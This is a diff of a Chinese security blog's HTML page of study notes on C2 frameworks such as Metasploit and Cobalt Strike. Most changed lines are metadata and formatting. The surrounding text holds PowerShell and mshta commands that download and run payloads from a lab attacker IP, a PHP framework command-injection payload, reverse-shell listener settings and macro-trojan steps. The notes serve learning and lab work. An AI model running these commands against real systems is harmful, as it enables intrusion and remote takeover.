@@ -17,12 +17,28 @@
 <meta property="og:description" content="Cobalt Strike、Metasploit、Sliver 等常见 C2 框架的功能、上线流程与流量特征认知。">
 <meta property="og:url" content="https://blogbu2154.site/c2-frameworks/">
 <meta property="og:site_name" content="swfk 的安全笔记">
-<meta property="og:image" content="/medias/featureimages/10.jpg">
-<meta name="twitter:card" content="summary">
+<meta property="og:locale" content="zh_CN">
+
+<meta property="og:image" content="https://blogbu2154.site/medias/featureimages/10.jpg">
+<meta property="og:image:alt" content="C2 工具 - swfk 的安全笔记">
+
+
+<meta property="article:published_time" content="2026-01-19T10:38:27+08:00">
+<meta property="article:modified_time" content="2026-01-19T10:38:27+08:00">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogbu2154.site/medias/featureimages/10.jpg">
 <link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
 <link rel="stylesheet" href="/css/clay.css">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<link rel="stylesheet" href="/aplayer/APlayer.min.css">
+
+
+<link rel="dns-prefetch" href="https://giscus.app">
+<link rel="preconnect" href="https://giscus.app" crossorigin>
+
+
+<link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
 
 <script>
   // 尽早恢复主题，避免首屏闪烁
@@ -92,8 +108,6 @@
         <div class="post-meta">
           <time datetime="2026-01-19">2026-01-19</time>
           
-            <span>更新于 2026-08-29</span>
-          
         </div>
       </header>
       
@@ -149,7 +163,7 @@
 <p><code>search  ms17_010</code></p>
 <p>设置选项</p>
 <p>运行模块 ，如果攻击成功，会进入 <code>**meterpreter**</code> 命令终端</p>
-<h2 id="举例-6：-web-delivery"><a href="#举例-6：-web-delivery" class="headerlink" title="举例 6： web_delivery"></a>举例 6： web_delivery</h2><p> <strong>无文件落地</strong>，类似于之前说的 powershell **远程加载执行脚本  **</p>
+<h2 id="举例-6：-web-delivery"><a href="#举例-6：-web-delivery" class="headerlink" title="举例 6： web_delivery"></a>举例 6： web_delivery</h2><p> <strong>无文件落地</strong>，类似于之前说的 powershell <strong>远程加载执行脚本</strong></p>
 <p><code>**powershell -ep bypass -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;ps1文件的下载网址&#39;);脚本运行的方法&quot;**</code></p>
 <p><code>search  web_delivery</code></p>
 <h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>设置配置</p>
@@ -208,7 +222,7 @@ shell         打开目标命令行</code></pre>
 <h2 id="staged-payload-和-stageless-payload"><a href="#staged-payload-和-stageless-payload" class="headerlink" title="staged payload 和 stageless payload"></a>staged payload 和 stageless payload</h2><p>查看 msfvenom 支持哪些 payload</p>
 <p> <code>msfvenom --list payloads</code></p>
 <ul>
-<li>**windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp **（staged payload 分段式 payload）</li>
+<li><strong>windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</strong>（staged payload 分段式 payload）</li>
 <li><strong>windows&#x2F;x64&#x2F;meterpreter_reverse_tcp</strong> （stageless payload 无分段 payload ）</li>
 </ul>
 <h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><ul>
@@ -225,21 +239,21 @@ shell         打开目标命令行</code></pre>
 <p><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=chmod 777 /tmp/123.elf</code></p>
 <p><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=/tmp/123.elf</code></p>
 <h3 id="5-上线"><a href="#5-上线" class="headerlink" title="5 上线"></a>5 上线</h3><h2 id="CobalStrike"><a href="#CobalStrike" class="headerlink" title="CobalStrike"></a>CobalStrike</h2><p>cs 也是 c2工具，基于图形化界面，有客户端和服务器两部分组成</p>
-<h2 id="Server-服务端"><a href="#Server-服务端" class="headerlink" title="Server 服务端"></a>Server 服务端</h2><p>有java 的设备上即可运行，默认端口 **50050  **</p>
+<h2 id="Server-服务端"><a href="#Server-服务端" class="headerlink" title="Server 服务端"></a>Server 服务端</h2><p>有java 的设备上即可运行，默认端口 <strong>50050</strong></p>
 <p><code>**./teamserver 192.168.2.153 123456**</code></p>
 <p><code>**如果想修改端口，直接编辑 teamserver 文件即可  **</code></p>
 <h2 id="Client-客户端"><a href="#Client-客户端" class="headerlink" title="Client 客户端"></a>Client 客户端</h2><p>有java 的设备上即可运行  （<strong>不行的话 切换 jdk 版本</strong>）</p>
 <h2 id="Listenter-监听器"><a href="#Listenter-监听器" class="headerlink" title="Listenter 监听器"></a>Listenter 监听器</h2><h2 id="Payload-生成木马文件"><a href="#Payload-生成木马文件" class="headerlink" title="Payload 生成木马文件"></a>Payload 生成木马文件</h2><h3 id="stager-payload-stageless-payload"><a href="#stager-payload-stageless-payload" class="headerlink" title="stager payload &#x2F; stageless payload"></a>stager payload &#x2F; stageless payload</h3><p><code>stager payload</code></p>
 <p><code>stageless payload</code></p>
 <h3 id="HTML-application"><a href="#HTML-application" class="headerlink" title="HTML application"></a>HTML application</h3><h4 id="HTA-是windows-html的"><a href="#HTA-是windows-html的" class="headerlink" title="HTA 是windows html的"></a><code>HTA 是windows html的</code></h4><h4 id="一种应用程序"><a href="#一种应用程序" class="headerlink" title="一种应用程序"></a><code>一种应用程序</code></h4><h4 id="支持在-hta-里封装-vbs-脚本"><a href="#支持在-hta-里封装-vbs-脚本" class="headerlink" title="支持在 hta 里封装 vbs 脚本"></a><code>支持在 hta 里封装 vbs 脚本</code></h4><h4 id="vbs-脚本再触发-powershell"><a href="#vbs-脚本再触发-powershell" class="headerlink" title="vbs 脚本再触发 powershell "></a><code>vbs 脚本再触发 powershell </code></h4><p> cobaltstrike 中 类似 <code>**python -m http.server **</code>的功能 <code>**Host File**  </code></p>
-<p> **复制链接 **</p>
+<p> <strong>复制链接</strong></p>
 <p><code>http://192.168.2.153:80/han</code></p>
 <p>如果忘记复制链接，可以到 Manage 里重新复制</p>
 <p><code>mshta 复制的拦截  </code></p>
 <p><code>mshta http://192.168.2.153:80/han</code></p>
 <h3 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web delivery"></a>web delivery</h3><p><code>复制链接并在靶机(cmd 上)执行即可上线 beacon  </code></p>
 <p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.2.153:1245/hansdxx&#39;))&quot;</code></p>
-<h3 id="office-宏木马"><a href="#office-宏木马" class="headerlink" title="office 宏木马"></a>office 宏木马</h3><p>**windows office 支持宏脚本，宏脚本 vbs ，vbs 可以嵌套powershell  **</p>
+<h3 id="office-宏木马"><a href="#office-宏木马" class="headerlink" title="office 宏木马"></a>office 宏木马</h3><p><strong>windows office 支持宏脚本，宏脚本 vbs ，vbs 可以嵌套powershell</strong></p>
 <p><strong>跟着步骤操作</strong></p>
 <p><code>受害者打开 docm 文件，即可上线  </code></p>
 <h4 id="beacon"><a href="#beacon" class="headerlink" title="beacon"></a>beacon</h4><p><code>双击exe即可上线 beacon  </code></p>
@@ -249,12 +263,12 @@ shell   dir
 shell   net  user</code></pre>
 
 <h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p><strong>默认 sleep 的时间是  1 min</strong></p>
-<p>**修改 sleep 的时间  **</p>
+<p><strong>修改 sleep 的时间</strong></p>
 <pre><code class="hljs plain">sleep  秒数
 sleep  1
 sleep  0</code></pre>
 
-<h4 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h4><h4 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h4><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><h4 id="vnc"><a href="#vnc" class="headerlink" title="vnc"></a>vnc</h4><h5 id="只读模式"><a href="#只读模式" class="headerlink" title="只读模式"></a>只读模式</h5><h5 id="控制模式"><a href="#控制模式" class="headerlink" title="控制模式"></a>控制模式</h5><h4 id="退出和删除"><a href="#退出和删除" class="headerlink" title="退出和删除"></a>退出和删除</h4><h2 id="cobaltstrike-和-meterpreter"><a href="#cobaltstrike-和-meterpreter" class="headerlink" title="cobaltstrike 和 meterpreter"></a>cobaltstrike 和 meterpreter</h2><h3 id="msf-meterpreter-转-cs-beacon"><a href="#msf-meterpreter-转-cs-beacon" class="headerlink" title="msf meterpreter 转 cs beacon"></a><code>msf meterpreter 转 cs beacon</code></h3><h4 id="1-上线-meterpreter"><a href="#1-上线-meterpreter" class="headerlink" title="1 上线 meterpreter"></a>1 上线 <code>meterpreter</code></h4><p>**msfvenom 生成木马 -&gt; msfconsole handler 开启监听 -&gt; 双击木马上线 **</p>
+<h4 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h4><h4 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h4><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><h4 id="vnc"><a href="#vnc" class="headerlink" title="vnc"></a>vnc</h4><h5 id="只读模式"><a href="#只读模式" class="headerlink" title="只读模式"></a>只读模式</h5><h5 id="控制模式"><a href="#控制模式" class="headerlink" title="控制模式"></a>控制模式</h5><h4 id="退出和删除"><a href="#退出和删除" class="headerlink" title="退出和删除"></a>退出和删除</h4><h2 id="cobaltstrike-和-meterpreter"><a href="#cobaltstrike-和-meterpreter" class="headerlink" title="cobaltstrike 和 meterpreter"></a>cobaltstrike 和 meterpreter</h2><h3 id="msf-meterpreter-转-cs-beacon"><a href="#msf-meterpreter-转-cs-beacon" class="headerlink" title="msf meterpreter 转 cs beacon"></a><code>msf meterpreter 转 cs beacon</code></h3><h4 id="1-上线-meterpreter"><a href="#1-上线-meterpreter" class="headerlink" title="1 上线 meterpreter"></a>1 上线 <code>meterpreter</code></h4><p><strong>msfvenom 生成木马 -&gt; msfconsole handler 开启监听 -&gt; 双击木马上线</strong></p>
 <h4 id="2-CS创建HTTP监听器"><a href="#2-CS创建HTTP监听器" class="headerlink" title="2 CS创建HTTP监听器"></a>2 CS创建HTTP监听器</h4><h4 id="3-msfconsole使用模块exploit"><a href="#3-msfconsole使用模块exploit" class="headerlink" title="3 msfconsole使用模块exploit"></a>3 msfconsole使用模块exploit</h4><h4 id="windows-local-payload-inject"><a href="#windows-local-payload-inject" class="headerlink" title="&#x2F;windows&#x2F;local&#x2F;payload_inject"></a>&#x2F;windows&#x2F;local&#x2F;payload_inject</h4><p><code>set payload windows/meterpreter/reverse_http</code></p>
 <p><code>set lhost 192.168.2.153</code></p>
 <p><code>set lport 1234</code></p>
@@ -433,7 +447,7 @@ sleep  0</code></pre>
 <script src="/js/clay.js"></script>
 <script src="/js/search.js"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/aplayer/APlayer.min.js"></script>
 <script src="/js/music-loader.js"></script>
 
 
